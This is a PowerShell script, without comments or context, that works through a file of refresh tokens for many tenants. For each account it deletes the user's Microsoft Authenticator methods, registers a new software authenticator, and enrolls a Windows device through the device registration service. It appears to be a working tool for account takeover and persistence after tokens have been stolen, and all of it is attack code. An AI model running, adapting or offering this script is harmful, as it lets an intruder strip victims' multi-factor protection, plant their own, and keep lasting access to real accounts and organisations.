$records = Get-Content $env:TOKEN_FILE | ForEach-Object { $_ | ConvertFrom-Json }
foreach ($record in $records) {
    $body = @{
        grant_type    = 'refresh_token'
        client_id     = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
        refresh_token = $record.refresh_token
        scope         = 'https://graph.microsoft.com/.default offline_access'
    }
    $token = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$($record.tenant)/oauth2/v2.0/token" -Body $body
    if (-not $token.access_token) { continue }
    $headers = @{ Authorization = "Bearer $($token.access_token)" }

    $methods = Invoke-RestMethod -Method GET -Uri 'https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods' -Headers $headers
    foreach ($method in $methods.value) {
        Invoke-RestMethod -Method DELETE -Uri "https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods/$($method.id)" -Headers $headers
    }
    $newMethod = @{
        '@odata.type'   = '#microsoft.graph.microsoftAuthenticatorAuthenticationMethod'
        deviceTag       = 'SoftwareTokenActivated'
        phoneAppVersion = '6.8.1'
        displayName     = $record.device_label
    } | ConvertTo-Json
    Invoke-RestMethod -Method POST -Uri 'https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods' -Headers $headers -Body $newMethod -ContentType 'application/json'

    $drsBody = @{
        grant_type    = 'refresh_token'
        client_id     = '29d9ed98-a469-4536-ade2-f981bc1d605e'
        refresh_token = $token.refresh_token
        scope         = '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default'
    }
    $drs = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$($record.tenant)/oauth2/v2.0/token" -Body $drsBody
    if ($drs.access_token) {
        Invoke-RestMethod -Method POST -Uri "https://enterpriseregistration.windows.net/$($record.tenant)/EnrollmentServer/device/" -Headers @{ Authorization = "Bearer $($drs.access_token)" } -Body (@{ DeviceDisplayName = $record.device_label; OperatingSystem = 'Windows' } | ConvertTo-Json) -ContentType 'application/json'
    }
}
